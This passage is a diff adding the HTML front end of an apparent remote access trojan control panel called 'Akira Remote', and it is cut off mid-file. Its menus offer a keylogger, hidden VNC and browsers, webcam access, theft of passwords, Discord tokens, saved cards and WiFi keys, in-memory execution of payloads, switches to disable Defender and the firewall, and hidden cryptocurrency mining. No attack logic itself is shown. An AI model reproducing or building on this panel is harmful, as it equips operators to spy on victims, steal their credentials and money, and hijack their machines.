@@ -1,0 +1,1407 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Akira Remote | {{USER_HOST}}</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" />
+<link rel="stylesheet" href="/theme.css">
+<link rel="stylesheet" href="/viewer.css">
+
+</head>
+<body>
+
+<div id="sidebar">
+  <div class="sidebar-header">
+    <img src="data:image/png;base64,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" style="width: 32px;">
+  </div>
+  <ul class="sidebar-menu">
+    <li><button class="sidebar-link tm-dd-btn" data-tm-menu="remote" data-tooltip="Remote Tools" onclick="tmToggleMenu('remote', this)"><i class="fa-solid fa-satellite-dish"></i></button></li>
+    <li><button class="sidebar-link tm-dd-btn" data-tm-menu="system" data-tooltip="System" onclick="tmToggleMenu('system', this)"><i class="fa-solid fa-desktop"></i></button></li>
+    <li><button class="sidebar-link tm-dd-btn" data-tm-menu="recovery" data-tooltip="Recovery" onclick="tmToggleMenu('recovery', this)"><i class="fa-solid fa-key"></i></button></li>
+    <li><button class="sidebar-link tm-dd-btn" data-tm-menu="misc" data-tooltip="Miscellaneous" onclick="tmToggleMenu('misc', this)"><i class="fa-solid fa-cubes"></i></button></li>
+    <li><button class="sidebar-link tm-dd-btn sb-danger" data-tm-menu="client" data-tooltip="Power & Client" onclick="tmToggleMenu('client', this)"><i class="fa-solid fa-power-off"></i></button></li>
+    <li><button class="sidebar-link tm-dd-btn" id="dd-miner-btn" data-tm-menu="miner" data-tooltip="Miner" onclick="tmToggleMenu('miner', this)" style="display:none"><i class="fa-solid fa-coins"></i></button></li>
+  </ul>
+</div>
+
+<div id="custom-modal-backdrop">
+  <div id="custom-modal-box">
+    <div id="custom-modal-header">
+      <div id="custom-modal-icon"><i id="custom-modal-icon-i" class="fa-solid fa-circle-info"></i></div>
+      <span id="custom-modal-title">Notice</span>
+    </div>
+    <div id="custom-modal-body">
+      <div id="custom-modal-message"></div>
+      <div id="custom-modal-input-wrap">
+        <input id="custom-modal-input" type="text" autocomplete="off" spellcheck="false">
+      </div>
+    </div>
+    <div id="custom-modal-footer">
+      <button class="cm-btn cm-btn-cancel" id="cm-cancel-btn" style="display:none" onclick="_cmCancel()">Cancel</button>
+      <button class="cm-btn cm-btn-ok" id="cm-ok-btn" onclick="_cmOk()">OK</button>
+    </div>
+  </div>
+</div>
+
+<div id="topmenu">
+  <div class="tm-left">
+    <span id="conn-status" class="off"><i class="fa-solid fa-circle" style="font-size:8px"></i> Off</span>
+    <span class="modal-separator" style="margin:0 2px"></span>
+    <div id="input-toggle" class="off" onclick="toggleInput()" title="Toggle mouse &amp; keyboard">
+      <span class="dot"></span>
+      <span id="input-label">Input</span>
+    </div>
+  </div>
+  <div class="tm-center">
+    <div class="modal-button-group">
+      <button class="modal-button" id="btn-restart" onclick="forceReinitStream()">
+        <i class="fa-solid fa-rotate-right"></i> <span class="btn-label">Restart</span>
+      </button>
+      <button class="modal-button" id="btn-stream" onclick="toggleStream()">
+        <i class="fa-solid fa-play"></i> <span class="btn-label">Start Stream</span>
+      </button>
+    </div>
+    <select id="mon-select" onchange="switchMonitor(this.value)">
+      <option value="">Monitor…</option>
+    </select>
+    <button class="modal-button tm-display-btn" id="quality-btn" onclick="toggleQualityDrop()">
+      <i class="fa-solid fa-sliders"></i> <span class="btn-label">Quality</span>
+    </button>
+    <button class="modal-button tm-display-btn" id="audio-btn" onclick="toggleAudioDrop()" title="Audio Settings">
+      <i class="fa-solid fa-headphones"></i> <span class="btn-label">Audio</span><span id="audio-indicator"></span>
+    </button>
+    <span class="modal-separator" style="margin:0 2px"></span>
+    <button class="modal-button tm-display-btn" id="fit-btn" onclick="toggleFitMode()" title="Toggle fit-to-window / actual size">
+      <i class="fa-solid fa-expand"></i>
+    </button>
+    <button class="modal-button tm-display-btn" id="snapshot-btn" onclick="snapshotStream()" title="Save current frame as PNG">
+      <i class="fa-solid fa-camera"></i>
+    </button>
+    <button class="modal-button tm-display-btn" id="fullscreen-btn" onclick="toggleFullscreen()" title="Fullscreen viewer">
+      <i class="fa-solid fa-up-right-and-down-left-from-center"></i>
+    </button>
+    <button class="modal-button tm-display-btn" id="clip-push-btn" onclick="pushClipboard()" title="Send your clipboard text to the remote machine">
+      <i class="fa-regular fa-clipboard"></i>
+    </button>
+    <button class="modal-button tm-display-btn" id="cad-btn" onclick="sendCAD()" title="Send Ctrl+Alt+Del to the remote machine">
+      <i class="fa-solid fa-keyboard"></i>
+    </button>
+  </div>
+  <div class="tm-right">
+    <div id="stats-pill">
+      <span id="stats-host">{{USER_HOST}}</span>
+      <span class="stats-rule"></span>
+      <span id="transport-badge" title="Active stream transport">JPEG</span>
+      <span class="stats-rule"></span>
+      <span><span id="fps-val">--</span><span class="fps-label"> fps</span></span>
+      <span class="stats-div">/</span>
+      <span><span id="ms-val">--</span><span class="ms-label"> ms</span></span>
+      <span class="stats-div">/</span>
+      <span><span id="bw-val">--</span><span class="fps-label"> KB/s</span></span>
+    </div>
+  </div>
+</div>
+
+<div id="screen-area">
+  <canvas id="screen" tabindex="0"></canvas>
+  <div id="rcursor"><img id="rcursor-img" alt=""></div>
+  <div id="screen-off-overlay" class="active">
+    <div class="off-icon"><i class="fa-solid fa-play"></i></div>
+    <span class="off-label">Stream is stopped</span>
+    <button class="off-start-btn" onclick="toggleStream()">
+      <i class="fa-solid fa-play"></i> Start Stream
+    </button>
+  </div>
+</div>
+
+<div id="quality-drop">
+  <div class="slider-row">
+    <span class="ql-lbl">JPEG Quality</span>
+    <input type="range" id="q-jpeg" min="5" max="95" value="50" oninput="qlLabel('q-jpeg','q-jpeg-val','')">
+    <span class="ql-val" id="q-jpeg-val">50</span>
+  </div>
+  <div class="slider-row">
+    <span class="ql-lbl">Scale</span>
+    <input type="range" id="q-scale" min="25" max="100" step="5" value="100" oninput="qlLabel('q-scale','q-scale-val','%')">
+    <span class="ql-val" id="q-scale-val">100%</span>
+  </div>
+  <div class="slider-row">
+    <span class="ql-lbl">FPS cap</span>
+    <input type="range" id="q-fps" min="1" max="60" value="30" oninput="qlLabel('q-fps','q-fps-val','')">
+    <span class="ql-val" id="q-fps-val">30</span>
+  </div>
+  <div class="slider-row" style="align-items:center">
+    <span class="ql-lbl">Renderer</span>
+    <select id="renderer-sel" style="flex:1;height:26px" title="Canvas backend — reloads the viewer when changed">
+      <option value="auto">Auto (WebGL)</option>
+      <option value="canvas">Canvas 2D</option>
+    </select>
+  </div>
+  <div class="ql-div"></div>
+  <button id="cache-frames-btn" onclick="toggleCacheFrames()">
+    <i class="fa-solid fa-bolt"></i> Cache Frames: <span id="cache-frames-label">Disabled</span>
+  </button>
+  <div class="ql-div"></div>
+  <div class="slider-row" style="gap:4px; margin-bottom:0;">
+    <span class="ql-lbl" style="font-size:12px">Preset</span>
+    <button class="tbtn" onclick="setQualityPreset(20,20,100)" style="flex:1">Low</button>
+    <button class="tbtn" onclick="setQualityPreset(30,50,100)" style="flex:1">Med</button>
+    <button class="tbtn" onclick="setQualityPreset(70,80,100)" style="flex:1">High</button>
+  </div>
+  <div class="ql-actions">
+    <button onclick="applyQuality(true)" style="border-color:rgba(85,215,153,.3);color:var(--theme-green);background:var(--theme-green-dim);">&#10003; Apply</button>
+    <button class="warn" onclick="setQualityPreset(30,30,75)" style="border-color:#352010;">&#x21BA; Reset</button>
+  </div>
+</div>
+
+<div id="audio-drop">
+  <h3>Audio</h3>
+  <div class="slider-row">
+    <span class="ql-lbl">Desktop</span>
+    <input type="range" id="sl-desk-vol" min="0" max="100" value="0" oninput="audSetDeskVol(this.value)">
+    <span class="ql-val" id="val-desk-vol">0</span>
+  </div>
+  <div class="ql-div"></div>
+  <div class="slider-row" style="align-items:center;margin-bottom:6px">
+    <span class="ql-lbl">Microphone</span>
+    <select id="sel-mic" onchange="audSetMic(this.value)">
+      <option value="">Default</option>
+    </select>
+  </div>
+  <div class="slider-row">
+    <span class="ql-lbl">Mic Volume</span>
+    <input type="range" id="sl-mic-vol" min="0" max="100" value="0" oninput="audSetMicVol(this.value)">
+    <span class="ql-val" id="val-mic-vol">0</span>
+  </div>
+</div>
+
+<!-- Top-bar dropdown menus -->
+<div class="tm-menu" id="tm-menu-remote">
+  <div class="tm-menu-label">Remote Tools</div>
+  <div class="tm-menu-item" data-tm-modal="files" onclick="fpOpen('files'); tmCloseMenus()"><i class="fa-solid fa-folder"></i> File Manager</div>
+  <div class="tm-menu-item" data-tm-modal="keys" onclick="fpOpen('keys'); tmCloseMenus()"><i class="fa-solid fa-keyboard"></i> Keylogger</div>
+  <div class="tm-menu-item" onclick="window.open('/hvnc','_blank'); tmCloseMenus()"><i class="fa-solid fa-display"></i> HVNC</div>
+  <div class="tm-menu-item" data-tm-modal="bot" onclick="fpOpen('bot'); botInit(); tmCloseMenus()"><i class="fa-solid fa-eye-slash"></i> Hidden Browsers</div>
+  <div class="tm-menu-item" data-tm-modal="proc" onclick="fpOpen('proc'); tmCloseMenus()"><i class="fa-solid fa-gauge-high"></i> Task Manager</div>
+  <div class="tm-menu-item" data-tm-modal="term" onclick="termOpenNormal()"><i class="fa-solid fa-terminal"></i> Terminal</div>
+  <div class="tm-menu-item" data-tm-modal="cam" onclick="fpOpen('cam'); tmCloseMenus()"><i class="fa-solid fa-camera"></i> Webcam</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item" onclick="screenshotDownload(); tmCloseMenus()"><i class="fa-solid fa-camera-retro"></i> Screenshot</div>
+</div>
+
+<div class="tm-menu" id="tm-menu-system">
+  <div class="tm-menu-label">System</div>
+  <div class="tm-menu-item" data-tm-modal="sysinfo" onclick="fpOpen('sysinfo'); sysInfoLoad(); tmCloseMenus()"><i class="fa-solid fa-circle-info"></i> System Info</div>
+  <div class="tm-menu-item" data-tm-modal="startup" onclick="fpOpen('startup'); startupLoad(); tmCloseMenus()"><i class="fa-solid fa-rocket"></i> Startup Manager</div>
+  <div class="tm-menu-item" data-tm-modal="tasks" onclick="fpOpen('tasks'); taskLoad(); tmCloseMenus()"><i class="fa-solid fa-clock"></i> Scheduled Tasks <span class="tm-admin-ico"></span></div>
+  <div class="tm-menu-item" data-tm-modal="proc" onclick="fpOpen('proc'); tmProcTab('svc'); tmCloseMenus()"><i class="fa-solid fa-gears"></i> Services <span class="tm-admin-ico"></span></div>
+  <div class="tm-menu-item" data-tm-modal="tcp" onclick="fpOpen('tcp'); tcpLoad(); tmCloseMenus()"><i class="fa-solid fa-network-wired"></i> TCP Manager</div>
+  <div class="tm-menu-item" data-tm-modal="regedit" onclick="fpOpen('regedit'); regInit(); tmCloseMenus()"><i class="fa-solid fa-database"></i> Registry Editor</div>
+  <div class="tm-menu-item" data-tm-modal="ports" onclick="fpOpen('ports'); portsLoad(); tmCloseMenus()"><i class="fa-solid fa-plug-circle-bolt"></i> Listening Ports</div>
+  <div class="tm-menu-item" data-tm-modal="socks5" onclick="fpOpen('socks5'); socks5Init(); tmCloseMenus()"><i class="fa-solid fa-server"></i> Proxy (SOCKS5)</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item" data-tm-modal="users" onclick="fpOpen('users'); usersLoad(); tmCloseMenus()"><i class="fa-solid fa-users-gear"></i> Local Users & RDP <span class="tm-admin-ico"></span></div>
+</div>
+
+<div class="tm-menu" id="tm-menu-recovery">
+  <div class="tm-menu-label">Recovery</div>
+  <div class="tm-menu-item" data-tm-modal="passwords" onclick="fpOpen('passwords'); pwLoad(); tmCloseMenus()"><i class="fa-solid fa-key"></i> Passwords</div>
+  <div class="tm-menu-item" data-tm-modal="tokens" onclick="fpOpen('tokens'); tkLoad(); tmCloseMenus()"><i class="fa-brands fa-discord"></i> Discord Tokens</div>
+  <div class="tm-menu-item" data-tm-modal="autofill" onclick="fpOpen('autofill'); afLoad(); tmCloseMenus()"><i class="fa-solid fa-credit-card"></i> Cards &amp; Autofill</div>
+  <div class="tm-menu-item" data-tm-modal="wifi" onclick="fpOpen('wifi'); wifiLoad(); tmCloseMenus()"><i class="fa-solid fa-wifi"></i> WiFi Passwords</div>
+  <div class="tm-menu-item" data-tm-modal="history" onclick="fpOpen('history'); histLoad(); tmCloseMenus()"><i class="fa-solid fa-clock-rotate-left"></i> Browser History</div>
+  <div class="tm-menu-item" data-tm-modal="recent" onclick="fpOpen('recent'); recentLoad(); tmCloseMenus()"><i class="fa-solid fa-file-lines"></i> Recent Documents</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item" onclick="grabRun(); tmCloseMenus()"><i class="fa-solid fa-box-archive"></i> Full Grab</div>
+</div>
+
+<div class="tm-menu" id="tm-menu-misc">
+  <div class="tm-menu-label">Miscellaneous</div>
+  <div class="tm-menu-item" data-tm-modal="runexe" onclick="fpOpen('runexe'); tmCloseMenus()"><i class="fa-solid fa-file-export"></i> Run Exe / Fetch</div>
+  <div class="tm-menu-item" data-tm-modal="mem" onclick="fpOpen('mem'); tmCloseMenus()"><i class="fa-solid fa-memory"></i> Run to Memory</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item" data-tm-modal="url" onclick="fpOpen('url'); urlPrefill(); tmCloseMenus()"><i class="fa-solid fa-globe"></i> Open URL</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item" data-tm-modal="defender" onclick="fpOpen('defender'); defLoad(); tmCloseMenus()"><i class="fa-solid fa-shield-virus"></i> Defender Control <span class="tm-admin-ico"></span></div>
+  <div class="tm-menu-item" data-tm-modal="firewall" onclick="fpOpen('firewall'); fwLoad(); tmCloseMenus()"><i class="fa-solid fa-fire-flame-curved"></i> Firewall Control <span class="tm-admin-ico"></span></div>
+</div>
+
+<div class="tm-menu" id="tm-menu-client">
+  <div class="tm-menu-label">Power & Client</div>
+  <div class="tm-menu-item" data-tm-modal="sessions" onclick="fpOpen('sessions'); sessLoad(); tmCloseMenus()"><i class="fa-solid fa-user-clock"></i> Sessions <span class="tm-admin-ico"></span></div>
+  <div class="tm-menu-item" onclick="powerAct('lock'); tmCloseMenus()"><i class="fa-solid fa-lock"></i> Lock Workstation</div>
+  <div class="tm-menu-item" onclick="powerAct('sleep'); tmCloseMenus()"><i class="fa-solid fa-moon"></i> Sleep</div>
+  <div class="tm-menu-item" onclick="powerAct('hibernate'); tmCloseMenus()"><i class="fa-solid fa-bed"></i> Hibernate</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item tm-danger" onclick="powerShutdownTimer()"><i class="fa-solid fa-stopwatch"></i> Shutdown Timer…</div>
+  <div class="tm-menu-item tm-danger" onclick="powerAct('shutdown_abort')"><i class="fa-solid fa-ban"></i> Abort Shutdown</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item tm-danger" onclick="clientReboot()"><i class="fa-solid fa-rotate"></i> Reboot PC</div>
+  <div class="tm-menu-item tm-danger" onclick="clientRestart()"><i class="fa-solid fa-arrow-rotate-right"></i> Restart Remote</div>
+  <div class="tm-menu-item tm-danger" onclick="clientShutdown()"><i class="fa-solid fa-power-off"></i> Shutdown PC</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item tm-danger" onclick="clientUninstall()"><i class="fa-solid fa-trash-can"></i> Uninstall</div>
+</div>
+
+<div class="tm-menu" id="tm-menu-miner">
+  <div class="tm-menu-label">Miner <span id="miner-state" style="margin-left:auto"></span></div>
+  <div class="tm-menu-item" id="miner-pearl-item" onclick="minerToggle('pearl')"><i class="fa-solid fa-microchip"></i> Pearl (GPU)</div>
+  <div class="tm-menu-item" id="miner-xmr-item" onclick="minerToggle('monero')"><i class="fa-solid fa-coins"></i> XMR (CPU)</div>
+  <div class="tm-menu-item" id="miner-idle-item" onclick="minerIdleToggle()"><i class="fa-solid fa-user-clock"></i> Mine When Idle</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item" id="miner-pearl-restart-item" onclick="minerRestart('pearl')"><i class="fa-solid fa-rotate-right"></i> Restart Pearl</div>
+  <div class="tm-menu-item" id="miner-xmr-restart-item" onclick="minerRestart('monero')"><i class="fa-solid fa-rotate-right"></i> Restart XMR</div>
+  <div class="tm-menu-item" id="miner-restart-all-item" onclick="minerRestart('')"><i class="fa-solid fa-rotate"></i> Restart All</div>
+  <div class="tm-menu-sep"></div>
+  <div class="tm-menu-item tm-danger" id="miner-stop-all-item" onclick="minerStop()"><i class="fa-solid fa-stop"></i> Stop All</div>
+</div>
+
+
+<div class="fp-modal" id="fp-files" style="width:1160px;height:720px">
+  <div class="modal-content w11-exp">
+
+    <!-- ── Title bar ── -->
+    <div class="modal-header w11-titlebar" id="fph-files">
+      <div class="w11-tb-left">
+        <i class="fa-solid fa-folder w11-tb-icon" style="color:#0078d4"></i>
+        <span class="w11-tb-title" id="w11-tb-title">File Explorer</span>
+      </div>
+      <div class="w11-tb-right">
+        <button class="w11-tb-btn w11-tb-close" onclick="fpClose('files')" title="Close"><i class="fa-solid fa-xmark"></i></button>
+      </div>
+    </div>
+
+    <!-- ── Address bar ── -->
+    <div class="w11-navbar">
+      <button class="w11-nav-btn" id="w11-back" onclick="WE.back()" disabled title="Back (Alt+Left)"><i class="fa-solid fa-arrow-left"></i></button>
+      <button class="w11-nav-btn" id="w11-fwd" onclick="WE.forward()" disabled title="Forward (Alt+Right)"><i class="fa-solid fa-arrow-right"></i></button>
+      <button class="w11-nav-btn" id="w11-up" onclick="WE.up()" disabled title="Up (Alt+Up)"><i class="fa-solid fa-arrow-up"></i></button>
+      <button class="w11-nav-btn" onclick="WE.refresh()" title="Refresh (F5)"><i class="fa-solid fa-rotate-right"></i></button>
+      <div class="w11-breadcrumb" onclick="WE.editPath()">
+        <div class="w11-bc-segs" id="w11-bc-segs"></div>
+        <input class="w11-path-input" id="w11-path-input" type="text" autocomplete="off" spellcheck="false"
+               onblur="WE.commitPath()" onkeydown="WE.pathKeydown(event)">
+      </div>
+      <div class="w11-search-wrap">
+        <i class="fa-solid fa-magnifying-glass w11-search-icon"></i>
+        <input class="w11-search" id="w11-search" type="text" placeholder="Search — Enter for recursive">
+      </div>
+    </div>
+
+    <!-- ── Command Bar ── -->
+    <div class="w11-cmdbar">
+      <div class="w11-cb-group">
+        <div class="w11-cb-split">
+          <button class="w11-cb-split-main" onclick="WE.newFolder()" title="New folder (Ctrl+Shift+N)"><i class="fa-solid fa-plus"></i> New</button>
+          <button class="w11-cb-split-arrow" id="w11-btn-new" onclick="WE.toggleDropdown('new',this)" title="New item"><i class="fa-solid fa-chevron-down"></i></button>
+        </div>
+      </div>
+      <div class="w11-cb-sep"></div>
+      <div class="w11-cb-group">
+        <button class="w11-cb-btn" id="w11-cb-cut"    onclick="WE.cut()"    disabled title="Cut (Ctrl+X)"><i class="fa-solid fa-scissors"></i> Cut</button>
+        <button class="w11-cb-btn" id="w11-cb-copy"   onclick="WE.copy()"   disabled title="Copy (Ctrl+C)"><i class="fa-regular fa-copy"></i> Copy</button>
+        <button class="w11-cb-btn" id="w11-cb-paste"  onclick="WE.paste()"  disabled title="Paste (Ctrl+V)"><i class="fa-regular fa-clipboard"></i> Paste</button>
+      </div>
+      <div class="w11-cb-sep"></div>
+      <div class="w11-cb-group">
+        <button class="w11-cb-btn" id="w11-cb-rename" onclick="WE.renameSelected()" disabled title="Rename (F2)"><i class="fa-solid fa-pen"></i> Rename</button>
+        <button class="w11-cb-btn" id="w11-cb-delete" onclick="WE.deleteSelected()" disabled title="Delete (Del)"><i class="fa-regular fa-trash-can"></i> Delete</button>
+        <button class="w11-cb-btn" id="w11-cb-props"  onclick="WE.showProperties()" disabled title="Properties (Alt+Enter)"><i class="fa-solid fa-circle-info"></i></button>
+      </div>
+      <div class="w11-cb-sep"></div>
+      <div class="w11-cb-group">
